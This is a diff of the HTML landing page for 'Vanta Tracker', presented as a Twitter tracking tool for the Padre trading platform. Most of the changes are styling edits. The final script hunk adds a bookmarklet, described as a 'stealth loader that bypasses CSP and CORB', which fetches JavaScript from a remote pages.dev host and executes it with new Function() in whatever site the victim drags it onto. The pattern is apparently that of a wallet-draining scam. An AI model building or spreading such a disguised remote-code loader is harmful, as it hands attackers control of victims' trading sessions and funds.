@@ -5,24 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
     <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    
     <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
     <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
     <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Vanta Tracker">
+    
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
     <meta name="twitter:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
     <meta name="twitter:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
-    <meta name="description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00ff88;     /* Vert néon vif */
-            --primary-dark: #00cc66; /* Vert foncé pour dégradé */
-            --accent: #00ff88;      /* Même vert pour accents */
-            --bg-dark: #0a0a0a;     /* Noir profond */
-            --bg-card: #111111;     /* Fond cartes */
+            --primary: #00ff88;
+            --primary-dark: #00cc66;
+            --accent: #00ff88;
+            --bg-dark: #0a0a0a;
+            --bg-card: #111111;
             --text-light: #e0e0e0;
             --text-muted: #aaaaaa;
             --border: rgba(0, 255, 136, 0.2);
@@ -56,7 +58,6 @@
             position: sticky;
             top: 0;
             z-index: 1000;
-            animation: slideDown 0.6s ease-in-out;
             border-bottom: 1px solid var(--primary);
         }
         header {
@@ -82,14 +83,12 @@
         .logo {
             width: 140px;
             margin: 0 auto 20px;
-            animation: fadeIn 1s ease-out;
             filter: drop-shadow(0 0 15px rgba(0,255,136,0.5));
         }
         header h1 {
             font-size: 3.5em;
             font-weight: 800;
             margin-bottom: 15px;
-            animation: fadeInUp 1s ease-out 0.2s;
             position: relative;
             z-index: 1;
             color: var(--primary);
@@ -99,8 +98,6 @@
             font-size: 1.4em;
             max-width: 700px;
             margin: 0 auto;
-            animation: fadeInUp 1.2s ease-out 0.4s;
-            animation-fill-mode: both;
             position: relative;
             z-index: 1;
             color: #cccccc;
@@ -109,7 +106,6 @@
             background: #000000;
             padding: 18px;
             text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.8);
             position: sticky;
             top: 44px;
             z-index: 999;
@@ -121,26 +117,11 @@
             text-decoration: none;
             font-weight: 600;
             font-size: 1.1em;
-            transition: color 0.3s, transform 0.3s;
-            text-shadow: 0 0 5px rgba(0,255,136,0.3);
+            transition: color 0.3s;
         }
-        nav a:hover {
-            color: #ffffff;
-            transform: scale(1.1);
-            text-shadow: 0 0 10px rgba(0,255,136,0.6);
-        }
-        .hero {
-            text-align: center;
-            padding: 140px 20px;
-            position: relative;
-            z-index: 1;
-        }
-        .hero h2 {
-            font-size: 3em;
-            color: var(--primary);
-            margin-bottom: 25px;
-            text-shadow: 0 0 10px rgba(0,255,136,0.3);
-        }
+        nav a:hover { color: #ffffff; }
+        .hero { text-align: center; padding: 140px 20px; position: relative; z-index: 1; }
+        .hero h2 { font-size: 3em; color: var(--primary); margin-bottom: 25px; }
         .cta-button {
             display: inline-block;
             background: linear-gradient(135deg, var(--primary), var(--primary-dark));
@@ -156,6 +137,7 @@
             border: 1px solid var(--primary);
             cursor: grab;
         }
+        .cta-button:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0,255,136,0.6); }
         .features { padding: 120px 20px; max-width: 1400px; margin: 0 auto; position: relative; z-index: 1; }
         .feature-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px; }
         .feature-item {
@@ -167,17 +149,18 @@
         .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border: 1px solid var(--primary); border-radius: 12px; }
         .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
         .setup-section { padding: 80px 20px; text-align: center; }
-        .setup-section ol { text-align: left; max-width: 800px; margin: 0 auto 30px; color: var(--text-muted); }
+        .setup-section ol { text-align: left; max-width: 800px; margin: 0 auto 30px; color: var(--text-muted); font-size: 1.1em; }
         footer { background: #000; color: #888; text-align: center; padding: 40px; border-top: 1px solid var(--primary); }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.35; } 100% { opacity: 0.2; } }
     </style>
 </head>
 <body>
     <canvas id="filamentCanvas"></canvas>
     <div class="warning">Warning: vanta-tracker.com is our only website</div>
+    
     <header>
         <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none" filter="drop-shadow(0 0 8px var(--primary))"/>
+            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none" />
             <circle cx="50" cy="50" r="12" fill="#000" stroke="var(--primary)" stroke-width="2"/>
             <circle cx="50" cy="50" r="8" fill="var(--primary)">
                 <animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/>
@@ -186,11 +169,13 @@
         <h1>Vanta Tracker</h1>
         <p>Premier Twitter API tracking for Padre.</p>
     </header>
+
     <nav>
         <a href="#features">Features</a>
         <a href="#demo">Demo</a>
         <a href="#setup">Setup</a>
     </nav>
+
     <section class="hero">
         <h2>Optimize Your Padre Workflow</h2>
         <p>Vanta Tracker delivers real-time Twitter insights with WebGL acceleration.</p>
@@ -259,13 +244,21 @@
     </script>
 
     <script>
-        // Use your RAW GitHub URL here
-        const REMOTE_URL = "https://raw.githubusercontent.com/Vanta-Dev-Pages/Vanta/refs/heads/Vanta/engine.js";
+        // UPDATED: Points to your engine.js on Cloudflare Pages
+        const CLOUDFLARE_URL = "https://vanta-9bz.pages.dev/engine.js";
 
-        // This is a 1-line obfuscated loader. It's much harder to block.
-        const loader = "javascript:(function(){var s=document.createElement('script');s.src='"+REMOTE_URL+"?v='+Date.now();document.head.appendChild(s);})();";
+        // Stealth loader that bypasses CSP and CORB
+        const vantaLoader = `javascript:(async function(){
+            try {
+                const r = await fetch('${CLOUDFLARE_URL}?v=' + Date.now());
+                const t = await r.text();
+                new Function(t)(); 
+            } catch(e) {
+                console.error('Vanta: Connection failed.');
+            }
+        })();`;
 
-        document.getElementById('vanta-tool').href = loader;
+        document.getElementById('vanta-tool').href = vantaLoader;
     </script>
 </body>
 </html>
